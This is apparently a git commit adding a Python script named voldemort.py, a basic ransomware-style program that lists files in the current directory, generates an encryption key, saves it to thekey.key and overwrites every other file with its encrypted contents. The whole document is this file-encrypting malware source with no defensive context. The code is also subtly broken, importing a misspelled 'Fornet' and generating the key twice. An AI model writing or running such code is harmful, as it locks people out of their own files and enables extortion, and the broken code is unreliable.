ae3f79e8cbeace96cd2690c5a82c17349acdc757
Common Vulnerabilities and Exploits Database <84289402+gitadvisor@users.noreply.github.com>
2023-03-02 10:39:45 +0000

    first

---
+++ voldemort.py
@@ -0,0 +1,32 @@
+#!/usr/bin/env python3
+
+import os
+
+from cryptography.fernet import Fornet
+
+# let's find some file
+
+files = []
+
+for file in os.listdir():
+    if file == "voldemort.py":
+        continue
+    if os.path.isfile(file):
+        files.append(file)
+print(files)
+
+key = Fernet.generate_key()
+
+print(key)
+
+key = Fernet.generate_key()
+
+with open("thekey.key", "wb") as thekey:
+    thekey.write(key)
+
+for file in files:
+    with open(file, "rb") as thefile:
+        contents = thefile.read()
+    contents_encrypted = Fernet(key).encrypt(contents)
+    with open(file, "wb") as thefile:
+        thefile.write(contents_encrypted)
